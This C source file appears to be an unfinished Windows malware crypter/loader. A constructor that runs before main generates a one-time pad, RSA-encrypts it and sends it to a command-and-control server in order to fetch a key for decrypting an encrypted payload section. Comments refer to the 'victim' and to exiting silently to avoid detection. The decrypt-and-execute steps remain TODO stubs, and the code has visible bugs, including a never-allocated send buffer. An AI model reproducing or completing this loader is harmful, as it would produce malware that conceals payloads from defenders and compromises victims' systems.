#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include "cryptor.h"
#include <wincrypt.h>
#include <ws2tcpip.h>
#include <bcrypt.h>
#include <ntstatus.h>


__attribute__((constructor, section(".cryptor"))) int construct(){

typedef BOOL (*CIPKIE2)(DWORD dwCertEncodingType, PCERT_PUBLIC_KEY_INFO pInfo, DWORD dwFlag, void *pvAuxInfo, BCRYPT_KEY_HANDLE *phKey);
CIPKIE2 CryptImportPublicKeyInfoEx2;
HMODULE CryptImport = LoadLibraryA("Crypt32.dll");
if( CryptImport ) {
	
 CryptImportPublicKeyInfoEx2 = (CIPKIE2)GetProcAddress(CryptImport,"CryptImportPublicKeyInfoEx2");
}
 /*
 * Get the section offsets for the cryptor to decrypt the payload stub
 */
    extern UINT64 START_OF_PAYLOAD;
    extern UINT64 END_OF_PAYLOAD;
    UINT64  addr_S = (UINT64)&START_OF_PAYLOAD;
    UINT64  addr_e = (UINT64)&END_OF_PAYLOAD;
/*
 * Define vars necessary to decode the IV
 */
    BYTE* iv = IV;
    BYTE* decodedIV = malloc(IVLEN+1);
    memset(decodedIV,0,IVLEN+1);
    DWORD sz = IVLEN;
/*
 * define variables necessary to decode the public key
 */
    BYTE* PemPubKey = PUBKEY; //Public key embedded in header
    PCCERT_CONTEXT pCertContext = NULL;
    BYTE* derPubKey;
    DWORD derPubKeyLen = RSAKEYLEN;
    BCRYPT_ALG_HANDLE alg;
    CERT_PUBLIC_KEY_INFO *PubKeyInfo;
    DWORD PubKeyInfoLen;
    BCRYPT_KEY_HANDLE hkey;
    BYTE* recvData;
    /*HCRYPTPROV hProvRSA = 0;
    HCRYPTKEY hKeyRSA = 0;*/
/*
 * Define Variables required to generate a cryptographically random integer
 */

    BCRYPT_ALG_HANDLE randNumProv;
    BYTE* OTP = malloc(AESKEYLEN+1);
    memset(OTP,0,AESKEYLEN+1);
/* 
 * Define variables required to store the encrypted OTP
 */
    PUCHAR EncryptedOTP;
    ULONG EncryptedOTPLen;
    ULONG EncryptedOTPWriteLen;

/*
 * Definitions of variables for the windows client
 */
    WSADATA  wsaData;
    struct addrinfo *result = NULL, init = {0};
    SOCKET Connection;
/*
 * retrieving the public key
 * in the event of an error silently exit 0. No reason to provide a return status to a victim
 */
   if(!CryptStringToBinaryA(PemPubKey,0, CRYPT_STRING_ANY, NULL, &derPubKeyLen,NULL,NULL))
   {
	DWORD err = GetLastError();   
	printf("DerLen %d",derPubKeyLen);
	exit(0);
   }
   derPubKey = (BYTE*)malloc(derPubKeyLen);
  if(!CryptStringToBinary(PemPubKey,0, CRYPT_STRING_BASE64, derPubKey, &derPubKeyLen,NULL,NULL))
   {
	DWORD err = GetLastError();   
	printf("failed to decode pem %d",err);
	exit(0);
   }
   if(BCryptOpenAlgorithmProvider(&alg, BCRYPT_RSA_ALGORITHM,NULL,0) != STATUS_SUCCESS)
   {
            printf("failed\n");
   	    DWORD err = GetLastError();
	    printf("Error AlgProvider: %d",err);
	   
	    exit(0);
    }
    if(!CryptDecodeObjectEx(X509_ASN_ENCODING, X509_PUBLIC_KEY_INFO, derPubKey,derPubKeyLen,
                            CRYPT_DECODE_ALLOC_FLAG,NULL,&PubKeyInfo,&PubKeyInfoLen))
    {
	    DWORD err = GetLastError();
	    printf("Error DecodeObject: %d",err);
	    exit(0);
    }
    if(!CryptImportPublicKeyInfoEx2( X509_ASN_ENCODING,PubKeyInfo,0, NULL,&hkey))
    {
	    DWORD err = GetLastError();
	    printf("Error ImportPubKeyInfo: %d",err);
	    exit(0);
    };

/*
 * Generate a one time pad generation
 * Generate 32 random bytes. These bytes are sent to the server encrypted with RSA 4096
 * The bytes will be XORed against the AES key used to decrypt the .payload section.
 */

    	if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&randNumProv, BCRYPT_RNG_ALGORITHM, NULL, 0)))
	{	
		printf ("error creating provider\n");
		exit(0);
	}
    	if (!BCRYPT_SUCCESS(BCryptGenRandom(randNumProv, (PUCHAR)(OTP), AESKEYLEN, 0)))
    	{
		printf("error generating random number");
		exit(0);
    	}
	if(!BCRYPT_SUCCESS(BCryptCloseAlgorithmProvider(randNumProv, 0)))
		{
			printf("error closing handaler");
			exit(0);
		}

	/*
 	* Encrypt the one time pad with the RSA key
 	*/
		
	
	if(BCryptEncrypt(hkey,(PUCHAR)(OTP), AESKEYLEN, NULL,NULL,0, NULL,0/* Ignored because pbOutput is null*/, &EncryptedOTPLen,BCRYPT_PAD_PKCS1) != STATUS_SUCCESS)
	{
		printf("error in calculating RSA output key length.");
		exit(0);
	}
	/*
 	* Encrypt the one time pad with the RSA key
 	*/
	if(BCryptEncrypt(hkey,(OTP), AESKEYLEN, NULL,NULL,0, EncryptedOTP,  EncryptedOTPLen, &EncryptedOTPWriteLen,BCRYPT_PAD_PKCS1) != STATUS_SUCCESS)
	{
		printf("ERROR IN ENCRYPTING");
		exit(0);
	}
	/*
 	* destroy are public key in a sane manner
 	*/
	
	if(BCryptDestroyKey(hkey) != STATUS_SUCCESS){
		printf("Error in destroying key");
		exit(0);
	}
	/*
 	 *  Configure socket descriptor and set the socket IP address
 	 */
	
	if (WSAStartup(0x0202,&wsaData))
    	{
		init.ai_family = AF_INET; // IPV4 address
   		init.ai_socktype = SOCK_STREAM; //define a reliable connection
    		init.ai_protocol = IPPROTO_TCP; // tcp because it's stable
	}
	if(getaddrinfo(IPADDR_SVR,PORT_SVR,&init,&result) == INVALID_SOCKET)
        	exit(-1);

    	if((Connection = socket(result->ai_family, result->ai_socktype, result->ai_protocol))==INVALID_SOCKET)
    	{
        	freeaddrinfo(result);
        	WSACleanup();
        	exit(0);
    	}
	
/*
 * Attempt to connect to the C2 server to retrieve the keys necessary to decrypt
 * the payolad section, for this to work this client transmits a OTP that has been
 * encrypted using an RSA public key (Length defined by the Conf file, default 4096)
 */
     	if(connect(Connection,result->ai_addr, (int)result->ai_addrlen) == SOCKET_ERROR)
     	{   
        	exit(-1);
     	}

	EncryptedOTPWriteLen = htonl(EncryptedOTPWriteLen);

	if(!send(Connection,(BYTE*)&EncryptedOTPWriteLen ,sizeof(ULONG),0))
	{
		exit(-1);
	}
	recvData = malloc(1);
	/*
	 * recieve a syncronizatioon byte to ensure data is recieved appropriatly. 
	 */
	if(!recv(Connection,recvData,1,0))
	{
		exit(-1);
	} 
	/*
	 * send the EncryptedOTP to the server
	 */
	EncryptedOTPWriteLen = ntohl(EncryptedOTPWriteLen);
	
	if(!send(Connection,(BYTE*)EncryptedOTP,EncryptedOTPWriteLen, 0))
	{
		printf("error sending EncryptedOTP (%d bytes).",EncryptedOTPWriteLen);
		exit(-1);
	}
	closesocket(Connection);
	/*
	 * send the EncryptedOTP to the server
	 */
/** TODO
  SEND ENCRYPTED OTP
 * RECIVE PAYLOAD ENCRYPTION KEY
 * USE OTP TO RETRIVE AES KEY
 */
/*
 * Decode The IV
 */
    if (!CryptStringToBinaryA(iv,IVENCLEN,CRYPT_STRING_BASE64, decodedIV,&sz,NULL,NULL))
        exit(0); /*
                  * silently exit, even though we exit with error we don't
                  * give this information to the OS
                  */
/** TODO
 *  DECYPT PAYLOAD
 *  RUN PAYLOAD
 */
return 0;
}

__attribute__((section(".payload"))) void payolad(){

printf("here");

}

int main()
{
return 0;//payolad();
}
